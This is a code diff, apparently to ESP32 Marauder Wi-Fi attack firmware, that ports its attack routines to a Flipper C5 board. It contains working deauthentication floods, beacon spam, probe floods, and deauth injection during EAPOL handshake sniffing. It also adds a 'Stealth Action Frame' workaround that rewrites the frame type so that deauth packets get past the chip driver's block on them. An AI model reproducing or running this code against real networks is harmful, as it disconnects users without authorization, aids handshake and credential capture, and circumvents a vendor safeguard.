   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2676,7 +2637,18 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
   
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  esp_wifi_set_mode(WIFI_MODE_NULL);
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_config_t ap_config = {};
+    memset(&ap_config, 0, sizeof(wifi_config_t));
+    strcpy((char*)ap_config.ap.ssid, "C5_Injection_Port");
+    ap_config.ap.ssid_len = strlen("C5_Injection_Port");
+    ap_config.ap.max_connection = 1;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  #else
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+  #endif
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
@@ -2782,7 +2754,11 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
   
     if (scan_mode != BT_SCAN_WAR_DRIVE_CONT) {
       NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
-      NimBLEDevice::setScanDuplicateCacheSize(200);
+      #ifdef MARAUDER_FLIPPER_C5
+        NimBLEDevice::setScanDuplicateCacheSize(50);
+      #else
+        NimBLEDevice::setScanDuplicateCacheSize(200);
+      #endif
     }
     NimBLEDevice::init("");
     pBLEScan = NimBLEDevice::getScan(); //create new scan
@@ -2810,14 +2786,14 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
         display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
       if (scan_mode == BT_SCAN_ALL)
-        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
+        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
       else if (scan_mode == BT_SCAN_AIRTAG) {
         this->clearAirtags();
-        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
+        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
       }
       else if (scan_mode == BT_SCAN_FLIPPER) {
         this->clearFlippers();
-        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
+        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
       }
     }
     else if ((scan_mode == BT_SCAN_WAR_DRIVE) || (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
@@ -2857,9 +2833,9 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
         display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
       if (scan_mode != BT_SCAN_WAR_DRIVE_CONT)
-        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
+        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
       else
-        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
+        pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
     }
     else if (scan_mode == BT_SCAN_SKIMMERS)
     {
@@ -2876,11 +2852,17 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
         display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
         display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
-      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
+      pBLEScan->setScanCallbacks(new bluetoothScanSkimmersCallback(), false);
     }
-    pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
-    pBLEScan->setInterval(100);
-    pBLEScan->setWindow(99);  // less or equal setInterval value
+    #ifdef MARAUDER_FLIPPER_C5
+      pBLEScan->setActiveScan(false); // Passive scan is stable on C5
+      pBLEScan->setInterval(200);
+      pBLEScan->setWindow(150);
+    #else
+      pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
+      pBLEScan->setInterval(100);
+      pBLEScan->setWindow(99);  // less or equal setInterval value
+    #endif
     pBLEScan->setMaxResults(0);
     pBLEScan->start(0, scanCompleteCB, false);
     Serial.println("Started BLE Scan");
@@ -4213,13 +4195,23 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_s
 
   packet[34] = custom_ssid.beacon->get(0);
   packet[35] = custom_ssid.beacon->get(1);
-  
 
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-
-  packets_sent = packets_sent + 3;
+  #ifdef MARAUDER_FLIPPER_C5
+    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+    if (packets_sent % 10 == 0) {
+      Serial.print("C5-Attack-Sent: "); Serial.print(packets_sent);
+      if (err != 0) { Serial.print(" ERR: "); Serial.println(err); }
+      else Serial.println(" (OK)");
+    }
+    vTaskDelay(10);
+    packets_sent++;
+  #else
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    packets_sent = packets_sent + 3;
+  #endif
 }
 
 void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
@@ -4256,16 +4248,26 @@ void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
 
 
 
-  // Add everything that goes after the SSID
   for(int i = 0; i < 12; i++) 
     packet[38 + fullLen + i] = postSSID[i];
-  
 
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-
-  packets_sent = packets_sent + 3;
+  #ifdef MARAUDER_FLIPPER_C5
+    // Defensive channel lock for C5 dual-band coordination
+    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    if (packets_sent % 10 == 0) {
+      Serial.print("C5-Attack-Sent: "); Serial.print(packets_sent);
+      if (err != 0) { Serial.print(" ERR: "); Serial.println(err); }
+      else Serial.println(" (OK)");
+    }
+    vTaskDelay(10);
+    packets_sent++;
+  #else
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    packets_sent = packets_sent + 3;
+  #endif
 }
 
 // Function to send beacons with random ESSID length
@@ -4305,11 +4307,25 @@ void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
     packet[38 + fullLen + i] = postSSID[i];
   
 
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-
-  packets_sent = packets_sent + 3;
+  #ifdef MARAUDER_FLIPPER_C5
+    // Defensive channel lock for C5 dual-band coordination
+    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+    esp_err_t err = esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    if (packets_sent % 10 == 0) {
+      Serial.print("C5-Beacon-Sent: "); Serial.print(packets_sent);
+      if (err != 0) { 
+        Serial.print(" ERR: "); Serial.print(err); 
+      }
+      else Serial.println(" (OK)");
+    }
+    vTaskDelay(10);
+    packets_sent++;
+  #else
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    packets_sent = packets_sent + 3;
+  #endif
   
 }
 
@@ -4350,11 +4366,15 @@ void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {
   for(int i = 0; i < 12; i++) 
     packet[38 + 6 + i] = postSSID[i];
 
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
+  #ifdef MARAUDER_FLIPPER_C5
+    // Give the RTOS scheduler a tick to free TX DMA buffers (fixes ESP_ERR_NO_MEM / err 257)
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+    vTaskDelay(10);
+  #else
+    esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
+  #endif
 
-  packets_sent = packets_sent + 3;
+  packets_sent++;
 }
 
 // Function to send probe flood to all "active" access points
@@ -4409,11 +4429,13 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
       
 
       // Send packet
-      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
-
-      packets_sent = packets_sent + 3;
+      esp_wifi_80211_tx(MARAUDER_IF, good_probe_req_packet, sizeof(good_probe_req_packet), false);
+      #ifdef MARAUDER_FLIPPER_C5
+        vTaskDelay(10);
+        packets_sent++;
+      #else
+        packets_sent = packets_sent + 3;
+      #endif
     }
   }
 }
@@ -4445,12 +4467,23 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[20] = bssid[4];
   deauth_frame_default[21] = bssid[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-
-  packets_sent = packets_sent + 3;
+  // Send packet (NOTE: C5 driver blocks 0xC0, so we use 0xD0 Action Frame bypass)
+  #ifdef MARAUDER_FLIPPER_C5
+    deauth_frame_default[0] = 0xD0; // Stealth Action Frame
+    esp_err_t err1 = esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+    if (packets_sent % 10 == 0) {
+      Serial.print("C5-Deauth-Attack (1): "); Serial.print(packets_sent);
+      if (err1 != 0) { Serial.print(" ERR: "); Serial.println(err1); }
+      else Serial.println(" (OK)");
+    }
+    vTaskDelay(10);
+    packets_sent++;
+  #else
+    esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+    esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+    esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+    packets_sent = packets_sent + 3;
+  #endif
 
   // Build AP dest packet
   deauth_frame_default[4] = bssid[0];
@@ -4474,10 +4507,12 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   deauth_frame_default[20] = mac[4];
   deauth_frame_default[21] = mac[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  // Send packet (NOTE: C5 driver blocks 0xC0, so we use 0xD0 Action Frame bypass)
+  #ifdef MARAUDER_FLIPPER_C5
+    deauth_frame_default[0] = 0xD0; // Stealth Action Frame
+  #endif
+  
+  esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
 
   packets_sent = packets_sent + 3;
 }
@@ -4508,10 +4543,18 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   deauth_frame_default[20] = bssid[4];
   deauth_frame_default[21] = bssid[5];      
 
-  // Send packet
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  // Send packet (NOTE: C5 driver blocks 0xC0, so we use 0xD0 Action Frame bypass)
+  #ifdef MARAUDER_FLIPPER_C5
+    deauth_frame_default[0] = 0xD0; // Stealth Action Frame
+  #endif
+  
+  esp_err_t err2 = esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  if (packets_sent % 10 == 0) {
+    Serial.print("C5-Deauth-Attack (2): "); Serial.print(packets_sent);
+    if (err2 != 0) { Serial.print(" ERR: "); Serial.println(err2); }
+    else Serial.println(" (OK)");
+  }
 
   packets_sent = packets_sent + 3;
 }
@@ -4545,10 +4588,23 @@ void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
       deauth_frame_default[20] = access_points->get(i).bssid[4];
       deauth_frame_default[21] = access_points->get(i).bssid[5];      
 
-      // Send packet
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+      // Send packet (C5 Stealth Bypass)
+      #ifdef MARAUDER_FLIPPER_C5
+        deauth_frame_default[0] = 0xD0; // Ensure Action Frame
+        esp_err_t err = esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+        if (err == 0) {
+          if (packets_sent % 10 == 0) { Serial.print("C5-Deauth-OK: "); Serial.println(packets_sent); }
+        } else {
+          if (packets_sent % 10 == 0) { Serial.print("C5-Deauth-ERR: "); Serial.println(err); }
+        }
+        vTaskDelay(10);
+        packets_sent++;
+      #else
+        esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+        esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+        esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default, sizeof(deauth_frame_default), false);
+        packets_sent = packets_sent + 3;
+      #endif
 
       packets_sent = packets_sent + 3;
     }
@@ -4633,19 +4689,14 @@ void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     //Serial.print(" ");
   
     #ifdef SCREEN_BUFFER
-      //if (display_obj.display_buffer->size() == 0)
-      //{
-      //  display_obj.loading = true;
-        //while(display_obj.display_buffer->size() >= 10)
-        //  delay(10);
-        if (display_obj.display_buffer->size() >= 10)
-          return;
+      if (display_obj.display_buffer->size() >= 10)
+        return;
 
-        display_obj.display_buffer->add(display_string);
-      //  display_obj.loading = false;
-        Serial.println(display_string);
-      //}
+      display_obj.display_buffer->add(display_string);
+      Serial.println(display_string);
     #endif
+  #elif defined(MARAUDER_FLIPPER_C5)
+    Serial.println(display_string);
   #endif
 
   buffer_obj.append(snifferPacket, len);
@@ -4697,9 +4748,14 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
       wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
       wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
     
-      // Send packet
-      esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
-      delay(1);
+      #ifdef MARAUDER_FLIPPER_C5
+        wifi_scan_obj.deauth_frame_default[0] = 0xD0; // Ensure Stealth Action Frame
+        esp_wifi_80211_tx(MARAUDER_IF, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
+        vTaskDelay(10);
+      #else
+        esp_wifi_80211_tx(MARAUDER_IF, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
+        delay(1);
+      #endif
     }
 
 
@@ -4809,9 +4865,14 @@ void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t
     wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
     wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
   
-    // Send packet
-    esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
-    delay(1);
+    #ifdef MARAUDER_FLIPPER_C5
+      wifi_scan_obj.deauth_frame_default[0] = 0xD0; // Ensure Stealth Action Frame
+      esp_wifi_80211_tx(MARAUDER_IF, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
+      vTaskDelay(10);
+    #else
+      esp_wifi_80211_tx(MARAUDER_IF, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
+      delay(1);
+    #endif
   }
 
 
@@ -5375,8 +5436,12 @@ void WiFiScan::main(uint32_t currentTime)
     #endif    
   }
   else if (currentScanMode == WIFI_ATTACK_AUTH) {
-    for (int i = 0; i < 55; i++)
+    for (int i = 0; i < 55; i++) {
       this->sendProbeAttack(currentTime);
+      #ifdef MARAUDER_FLIPPER_C5
+        delay(1); // Yield for C5 radio buffer
+      #endif
+    }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
@@ -5395,8 +5460,12 @@ void WiFiScan::main(uint32_t currentTime)
     }
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
-    for (int i = 0; i < 55; i++)
+    for (int i = 0; i < 55; i++) {
       this->sendDeauthAttack(currentTime, this->dst_mac);
+      #ifdef MARAUDER_FLIPPER_C5
+        delay(1); // Yield for C5 radio buffer
+      #endif
+    }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
@@ -5415,8 +5484,12 @@ void WiFiScan::main(uint32_t currentTime)
     }
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
-    for (int i = 0; i < 55; i++)
+    for (int i = 0; i < 55; i++) {
       this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);
+      #ifdef MARAUDER_FLIPPER_C5
+        delay(1); // Yield for C5 radio buffer
+      #endif
+    }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
@@ -5447,8 +5520,12 @@ void WiFiScan::main(uint32_t currentTime)
             Station cur_sta = stations->get(cur_ap.stations->get(i));
 
             // Send deauths for each selected AP's selected Station
-            for (int y = 0; y < 25; y++)
+            for (int y = 0; y < 25; y++) {
               this->sendDeauthFrame(cur_ap.bssid, cur_ap.channel, cur_sta.mac);
+              #ifdef MARAUDER_FLIPPER_C5
+                vTaskDelay(1); // Yield for C5 radio buffer
+              #endif
+            }
 
             // Display packets sent on screen
             if (currentTime - initTime >= 1000) {
@@ -5508,14 +5585,18 @@ void WiFiScan::main(uint32_t currentTime)
   {
     // Need this for loop because getTouch causes ~10ms delay
     // which makes beacon spam less effective
-    for (int i = 0; i < 55; i++)
+    for (int i = 0; i < 55; i++) {
       broadcastRandomSSID(currentTime);
+      #ifdef MARAUDER_FLIPPER_C5
+        delay(1); // Yield for C5 radio buffer
+      #endif
+    }
 
     if (currentTime - initTime >= 1000)
     {
       initTime = millis();
-      //Serial.print("packets/sec: ");
-      //Serial.println(packets_sent);
+      Serial.print("packets/sec: ");
+      Serial.println(packets_sent);
       String displayString = "";
       String displayString2 = "";
       displayString.concat(text18);
@@ -5571,6 +5652,9 @@ void WiFiScan::main(uint32_t currentTime)
       for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
       {
         broadcastSetSSID(currentTime, rick_roll[x]);
+        #ifdef MARAUDER_FLIPPER_C5
+          delay(1); // Yield for C5 radio buffer
+        #endif
       }
     }
 
